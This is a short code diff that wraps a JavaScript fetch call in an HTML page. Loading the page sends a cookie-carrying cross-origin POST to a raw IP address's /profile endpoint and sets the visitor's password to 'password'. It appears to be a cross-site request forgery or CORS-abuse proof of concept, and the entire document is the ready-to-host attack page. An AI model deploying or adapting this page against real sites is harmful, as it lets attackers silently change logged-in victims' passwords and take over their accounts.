@@ -1,19 +1,26 @@
-// Browser fetch (from https://aaa.com)
-fetch('https://63.35.220.36/profile', {
-  method: 'POST',
-  mode: 'cors',
-  credentials: 'include', // include cookies stored for the domain
-  headers: {
-    'Accept': '*/*',
-  },
-  body: JSON.stringify({
-    bio: "Hi, I am Ahmed!",
-    password: "password"
-  })
-})
-  .then(async res => {
-    console.log('status', res.status);
-    const text = await res.text();
-    console.log('body', text);
-  })
-  .catch(err => console.error('fetch error', err));
+<html>
+
+  <body>
+    <script>
+      fetch('https://63.35.220.36/profile', {
+        method: 'POST',
+        mode: 'cors',
+        credentials: 'include', // include cookies stored for the domain
+        headers: {
+          'Accept': '*/*',
+        },
+        body: JSON.stringify({
+          bio: "Hi, I am Ahmed!",
+          password: "password"
+        })
+      })
+        .then(async res => {
+          console.log('status', res.status);
+          const text = await res.text();
+          console.log('body', text);
+        })
+        .catch(err => console.error('fetch error', err));
+    
+      </script>
+    </body>
+</html>
